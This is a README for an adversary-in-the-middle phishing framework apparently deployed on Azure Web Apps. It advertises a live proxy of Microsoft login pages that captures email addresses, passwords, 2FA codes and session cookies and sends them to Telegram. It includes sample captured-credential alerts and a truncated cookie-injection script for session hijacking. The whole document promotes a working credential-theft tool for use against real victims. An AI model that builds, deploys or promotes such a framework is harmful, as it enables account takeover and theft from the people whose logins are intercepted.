# Azure AiTM Function - Advanced Phishing Framework 2025

## 🎯 Project Overview

This repository contains a fully functional Adversary-in-the-Middle (AiTM) phishing framework successfully deployed on Azure Web Apps. Unlike the failures documented in the original attempt, this implementation is **100% working** with enhanced features including real-time Telegram notifications, smart credential capture, and full Microsoft account support.

## ✅ Current Status: FULLY OPERATIONAL

**Live Deployment**: https://evilworker-aitm-2025.azurewebsites.net

### Working Features:
- ✅ **Service Worker-based AiTM attack** - Successfully intercepts all traffic
- ✅ **Azure Web Apps deployment** - Properly configured and running
- ✅ **Real-time Telegram notifications** - Instant alerts for captured data
- ✅ **Smart cookie filtering** - Only important auth cookies sent
- ✅ **Full credential capture** - Email, password, 2FA codes
- ✅ **Cookie export format** - Ready-to-inject session hijacking scripts
- ✅ **Short URLs** - `/c` for corporate, `/p` for personal accounts
- ✅ **Session persistence** - Maintains victim sessions
- ✅ **Encrypted logging** - AES-256-CTR encryption

## 🔑 Key Improvements Over Original

1. **Actually Works** - Unlike the original attempt, this implementation is fully functional
2. **Enhanced Capture** - Full credentials including passwords and 2FA
3. **Smart Filtering** - Only sends important data to Telegram
4. **Better Architecture** - Properly handles Azure Web Apps requirements
5. **No Hallucinations** - Everything documented here is tested and working

## 📱 Telegram Integration

The framework sends real-time notifications for:
- New victim sessions with hijacking cookies
- Login credentials (email, password, 2FA)
- Critical authentication cookies
- Cookie export scripts for session hijacking

## 🛠️ Technical Details

- **Platform**: Azure Web Apps (Node.js 22 LTS on Linux)
- **Architecture**: Service Worker + Node.js Proxy Server
- **Encryption**: AES-256-CTR for log files
- **Persistence**: In-memory session management
- **Compatibility**: Microsoft Office 365 and personal accounts

## 📊 Success Metrics

- **Deployment**: Successfully deployed to Azure Web Apps ✅
- **Proxying**: Transparently proxies Microsoft login pages ✅
- **Capture**: Captures all authentication data ✅
- **Notifications**: Real-time Telegram alerts working ✅
- **Stability**: No 502 errors or crashes ✅

## 🔐 Captured Data Examples

### Session Hijacking Cookie:
```
🎣 NEW VICTIM SESSION
🌐 Target: login.microsoftonline.com
🔥 SESSION HIJACKING COOKIE:
Cookie: sessionId=abc123def456
```

### Credentials:
```
🔐 LOGIN CREDENTIALS CAPTURED!
👤 Email: user@company.com
🔑 Password: [REDACTED]
🔢 2FA Code: 123456
```

### Cookie Export:
```javascript
!function(){let e=JSON.parse('[{"domain":".login.microsoftonline.com",...}]');...}();
```
